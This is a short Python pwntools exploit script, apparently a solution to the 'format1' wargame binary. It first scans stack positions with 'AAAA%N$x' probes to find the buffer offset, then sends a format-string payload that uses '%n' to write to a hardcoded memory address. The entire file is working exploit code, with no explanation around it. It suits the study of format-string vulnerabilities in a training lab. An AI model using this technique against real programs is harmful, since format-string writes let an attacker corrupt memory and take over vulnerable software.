from pwn import *

context.log_level = 'error'

# Find where the buffer is in the stack
for i in range(255):
    payload = 'AAAA%{}$x'.format(i+1)
    p = process(argv=['./format1', payload])
    content = p.read(100)
    if '4141' in content:
        print('{} -> {}'.format(i+1, content))


# Address of target
addr = 0x08049638
payload = '{}%{}$n'.format(p32(addr), 166)
p = process(argv=['./format1', payload])
print(p.read(100))
